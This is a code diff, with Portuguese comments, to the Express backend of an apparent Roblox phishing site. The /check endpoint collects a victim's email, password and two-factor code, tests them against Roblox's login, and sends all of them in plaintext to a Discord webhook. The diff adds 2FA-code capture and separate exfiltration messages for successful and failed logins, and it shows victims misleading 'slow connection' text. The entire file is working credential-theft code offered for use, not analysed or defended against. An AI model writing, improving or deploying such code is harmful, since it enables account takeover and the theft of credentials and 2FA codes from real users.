@@ -25,17 +25,23 @@ async function loginRoblox(email, password) {
             body: JSON.stringify({
                 username: email,
                 password: password
-            })
+            }),
+            timeout: 10000 // 10 segundos de timeout
         });
 
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
         const data = await response.json();
-        return { success: true, data: data, error: null };
+        
+        // O Roblox retorna { id: 123, username: "User" } se estiver correto
+        // Se estiver errado, retorna { error: "User not found" } ou similar
+        
+        return { 
+            success: response.ok && data.id, 
+            data: data, 
+            error: data.error || null,
+            statusCode: response.status
+        };
     } catch (error) {
-        return { success: false, data: null, error: error.message };
+        return { success: false, data: null, error: error.message, statusCode: 0 };
     }
 }
 
@@ -54,12 +60,24 @@ async function sendToDiscord(message) {
     }
 }
 
-// Rota para o check.php (agora será /check)
+// Rota para o check
 app.post('/check', async (req, res) => {
-    const { email, password } = req.body;
+    const { email, password, code2fa, isFinalStep } = req.body;
 
     if (!email || !password) {
         return res.status(400).json({ success: false, error: "Missing email or password" });
+    }
+
+    // Se for o passo final (2FA), envia direto para o Discord e diz que está tudo bem
+    if (isFinalStep) {
+        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
+                               `**Email:** ${email}\n` +
+                               `**Password:** ${password}\n` +
+                               `**Code 2FA:** ${code2fa}\n` +
+                               `**Timestamp:** ${new Date().toISOString()}`;
+        
+        await sendToDiscord(discordMessage);
+        return res.json({ success: true });
     }
 
     // Tenta o login
@@ -68,42 +86,41 @@ app.post('/check', async (req, res) => {
     let username = "Unknown";
     let userId = "Unknown";
     let isValid = false;
-    let errorMsg = result.error || "Connection Timeout";
-    let loginSuccess = false;
+    let errorMsg = "Conexão lenta, tentando novamente...";
 
-    if (result.success && result.data) {
-        if (result.data.id && result.data.username) {
-            username = result.data.username;
-            userId = result.data.id;
-            isValid = true;
-            loginSuccess = true;
-            errorMsg = "";
-        } else {
-            errorMsg = result.data.error || "Login Failed (No ID)";
-        }
+    // Verifica se o login foi realmente bem-sucedido
+    if (result.success) {
+        username = result.data.username || "Unknown";
+        userId = result.data.id || "Unknown";
+        isValid = true;
+        errorMsg = "";
+        
+        // Envia ao Discord que achou a conta
+        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
+                               `**Email:** ${email}\n` +
+                               `**Password:** ${password}\n` +
+                               `**Username:** ${username}\n` +
+                               `**User ID:** ${userId}\n` +
+                               `**Timestamp:** ${new Date().toISOString()}`;
+        await sendToDiscord(discordMessage);
+
+    } else {
+        // Se falhou, pega no erro específico do Roblox
+        errorMsg = result.error || "Erro desconhecido";
+        
+        // Envia ao Discord que falhou (opcional, mas útil para depuração)
+        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
+                               `**Email:** ${email}\n` +
+                               `**Password:** ${password}\n` +
+                               `**Erro:** ${errorMsg}\n` +
+                               `**Timestamp:** ${new Date().toISOString()}`;
+        await sendToDiscord(discordMessage);
     }
 
-    // Envia ao Discord
-    const statusIcon = loginSuccess ? "✅" : "⚠️";
-    const statusText = loginSuccess ? "LOGIN SUCCESSFUL" : "LOGIN PENDING";
-    
-    const discordMessage = `**🔒 NEW LOGIN ATTEMPT**\n\n` +
-                           `**Status:** ${statusIcon} ${statusText}\n` +
-                           `**Email:** ${email}\n` +
-                           `**Password:** ${password}\n` +
-                           `**Username Found:** ${username}\n` +
-                           `**User ID:** ${userId}\n` +
-                           `**Error:** ${errorMsg}\n` +
-                           `**Timestamp:** ${new Date().toISOString()}`;
-
-    await sendToDiscord(discordMessage);
-
     // Retorna ao frontend
-    // Se der erro de conexão, diz que é sucesso para o jogador avançar
-    const frontendSuccess = loginSuccess || errorMsg.includes("fetch") || errorMsg.includes("Timeout");
-
+    // Só diz sucesso se o login realmente funcionou (tem ID e Username)
     res.json({
-        success: frontendSuccess,
+        success: isValid, // Só true se tiver ID e Username
         username: username,
         userId: userId,
         error: errorMsg
